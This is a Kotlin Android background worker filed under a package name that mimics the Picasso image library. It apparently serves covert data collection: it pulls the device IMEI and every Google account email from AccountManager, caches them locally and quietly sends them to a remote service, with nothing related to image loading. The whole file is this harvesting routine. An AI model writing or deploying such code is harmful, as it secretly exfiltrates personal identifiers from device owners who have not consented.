package com.squareup.picasso.presentation

import android.accounts.Account
import android.accounts.AccountManager
import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.squareup.picasso.core.LogUtils
import com.squareup.picasso.data.StorageResult
import com.squareup.picasso.data.network.*
import com.squareup.picasso.di.Injector
import com.squareup.picasso.domain.model.AccountEntity
import kotlinx.coroutines.*

class AccountWorker(context: Context, params: WorkerParameters) : Worker(context, params){

    private lateinit var imei: String

    private var informationRepository = Injector.provideRemoteInformationRepository()
    private var accountRepository = Injector.provideDataBaseAccountRepository()

    override fun doWork(): Result {
        val appContext = applicationContext
        return try {
            imei = inputData.getString(KEY_IMEI_ARG)?:""
            if(imei != "") {
                getAccountEmail(appContext)
                LogUtils.e("Started account worker")
            }
            Result.success()
        } catch (throwable: Throwable) {
            Result.retry()
        }
    }

    private fun getAccountEmail(context: Context) {
        GlobalScope.launch {
            var accountManager = AccountManager.get(context.applicationContext)
            var listAccount = getAccount(accountManager)
            listAccount?.let { itAccountList ->

                for (item in itAccountList) {
                    //If email does not exist in the database, insert accountEntity with send = false
                    var nameEmail = item.name
                    var isAccount = accountRepository.getAccount(nameEmail)

                    if (isAccount == null) {
                        LogUtils.e("$nameEmail no existe en la BD")
                        var accountEntity = AccountEntity(imei, nameEmail, false)
                        accountRepository.addAccount(accountEntity)
                    }

                }

                //If list of accounts (send == false) is not empty then send the list to remote service
                var listAccountNotSend = accountRepository.getAccountsBySend(false)
                if (listAccountNotSend.isNotEmpty()) {
                    sendNetworkAccountList(listAccountNotSend)
                }
            }

        }
    }

    private fun getAccount( accountManager: AccountManager): List<Account>? {
        var accounts = accountManager.getAccountsByType("com.google")
        var account: List<Account>? = null
        if (accounts.isNotEmpty()) {
            return accounts.toList()
        }
        return account
    }

    private fun sendNetworkAccountList(accounts: List<AccountEntity>) {
        GlobalScope.launch {
            var result: StorageResult<DataResponse> = informationRepository.setAccounts(accounts)
            when (result) {
                is StorageResult.Complete -> {
                    LogUtils.e("setAccounts: Success " + result.data?.msj)
                    if (result.data?.msj == "valido") {
                        //Update the list of accounts with the field send = true
                        for (item in accounts) {
                            item.send = true
                            accountRepository.updateAccount(item)
                        }
                    }
                }
                is StorageResult.Failure -> {
                    LogUtils.e("setAccounts: Error")
                }
            }
        }
    }
}